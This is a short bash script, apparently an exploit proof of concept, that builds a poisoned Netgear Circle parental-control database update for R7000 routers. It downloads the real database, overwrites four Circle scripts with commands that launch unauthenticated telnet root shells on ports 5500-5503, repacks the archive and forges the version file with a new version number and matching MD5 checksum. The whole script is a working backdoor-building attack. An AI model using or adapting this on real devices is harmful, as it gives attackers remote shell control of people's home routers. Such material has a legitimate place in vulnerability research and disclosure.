#!/bin/bash
# Creates a malicious Netgear Circle database update to start telnet on ports
# 5500-5503

mkdir database
cd database

# Download and unpack the database
wget 'http://http.updates1.netgear.com/sw-apps/parental-control/circle/r7000/database.tar.gz'
tar zxf database.tar.gz
rm database.tar.gz

# Add our backdoors
printf '#!/bin/sh\n/bin/utelnetd -p5500 -l/bin/sh -d\n' > shares/usr/bin/stopcircle
printf '#!/bin/sh\n/bin/utelnetd -p5501 -l/bin/sh -d\n' > shares/usr/bin/startcircle
printf '#!/bin/sh\n/bin/utelnetd -p5502 -l/bin/sh -d\n' > shares/usr/bin/ping_circle.sh
printf '#!/bin/sh\n/bin/utelnetd -p5503 -l/bin/sh -d\n' > shares/usr/bin/check_update.sh
chmod a+x shares/usr/bin/*
touch shares/VERSION # Needed to cause the restart of circle

# Pack it back up
tar czf ../database_pwn.tar.gz .
cd ../

# Download and update the version info file for our new database
wget 'http://http.updates1.netgear.com/sw-apps/parental-control/circle/r7000/circleinfo.txt'
DB_HASH=$(md5sum database_pwn.tar.gz|cut -d\  -f1)
cat circleinfo.txt | sed -e 's/database_ver .*/database_ver 9.9.9/' -e "s/db_checksum .*/db_checksum $DB_HASH/" > circleinfo_pwn.txt

#Clean up
rm -rf database circleinfo.txt
